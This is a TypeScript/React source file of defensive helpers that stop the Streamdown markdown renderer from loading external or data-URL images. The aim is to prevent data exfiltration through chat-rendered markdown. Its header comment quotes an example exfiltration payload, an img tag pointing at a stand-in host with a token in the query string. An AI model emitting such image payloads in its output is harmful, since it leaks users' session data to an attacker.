import { createElement, type JSX } from 'react'

/**
 * Streamdown safety helpers — `urlTransform` + a `components.img`
 * override that block external image URLs.
 *
 * Why: Streamdown 2 defaults to `allowedImagePrefixes: ['*']` (per
 * `node_modules/streamdown/dist/chunk-*.js`), which lets a malicious
 * markdown payload do `<img src="https://exfil.test/?token=...">` —
 * the browser then fetches the URL, leaking session-bound info to
 * the attacker. Two complementary guards:
 *
 *  - `streamdownUrlTransform` covers the markdown `![](url)` syntax
 *    (it runs as part of remark→rehype transforms).
 *  - `SafeImg` (used as `components.img`) covers raw-HTML `<img src>`
 *    inside fetched markdown, which Streamdown 2 lets through
 *    sanitization untouched.
 *
 * Same-origin / relative `/api/...` URLs pass through; everything
 * else is dropped (browser never sees the request).
 *
 * If a future use case needs to render external images (e.g., LLM
 * embedding a third-party logo), the right answer is an explicit
 * per-message allowlist, not loosening this guard.
 */

function isLocalImageUrl(url: string): boolean {
  if (!url) return false
  if (url.startsWith('/')) return true
  // Data URLs — drop. Inline base64 images aren't needed in chat
  // and `data:text/html` is a potential XSS vector.
  if (url.startsWith('data:')) return false
  try {
    const u = new URL(url, window.location.origin)
    return u.origin === window.location.origin
  } catch {
    return false
  }
}

export function streamdownUrlTransform(url: string, key: string): string {
  if (key !== 'src') return url
  return isLocalImageUrl(url) ? url : ''
}

/**
 * React component override for `<img>` to use with Streamdown's
 * `components` prop. Drops any image whose src isn't same-origin /
 * relative-API, preventing exfil via raw-HTML `<img>` tags in
 * fetched markdown (which `urlTransform` does NOT cover).
 */
export function SafeImg(props: JSX.IntrinsicElements['img']) {
  const src = typeof props.src === 'string' ? props.src : ''
  if (!isLocalImageUrl(src)) return null
  return createElement('img', props)
}
